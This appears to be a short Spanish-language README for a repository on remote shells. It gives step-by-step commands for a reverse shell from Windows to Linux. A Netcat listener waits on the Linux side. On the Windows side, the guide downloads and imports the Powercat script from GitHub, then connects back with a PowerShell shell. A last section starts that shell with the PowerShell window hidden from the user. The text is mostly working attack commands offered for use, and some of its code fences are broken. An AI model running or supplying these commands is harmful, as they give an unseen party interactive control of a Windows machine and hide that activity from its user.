# RemotePowerShells
Repositorio sobre shell remotas.


# Shell Remota entre Linux y Windows

Guía paso a paso para establecer una shell remota entre una máquina Linux y una máquina Windows utilizando Netcat y Powercat.

## En la máquina Linux (Listener)

1. Abre una terminal.
2. Ejecuta el siguiente comando para iniciar un listener con Netcat:
   ```
   bash
   nc -lvp 4444
   ```
   Donde `4444` es el puerto en el que deseas escuchar.

## En la máquina Windows (Conector)

1. Abre PowerShell.
2. Descarga e importa el módulo Powercat con los siguientes comandos:
   \`\`\`powershell
   Invoke-WebRequest "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1" -OutFile powercat.ps1
   Import-Module ./powercat.ps1
   \`\`\`
3. Conecta tu máquina Windows a la máquina Linux con el siguiente comando:
   \`\`\`powershell
   powercat -c <ip-address> -p 4444 -ep powershell
   \`\`\`
   Donde `<ip-address>` es la dirección IP de tu máquina Linux y `4444` es el puerto que especificaste en el comando Netcat.

Ahora, cuando te conectes desde tu máquina Linux, obtendrás una shell de PowerShell de tu máquina Windows.
\`\`\`

### Inicia una shell remota con la ventana de PowerShell oculta con el siguiente comando:
   ```powershell
   Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command & {powercat -c <ip-address> -p 4444 -ep powershell}" 
   \`\`\`
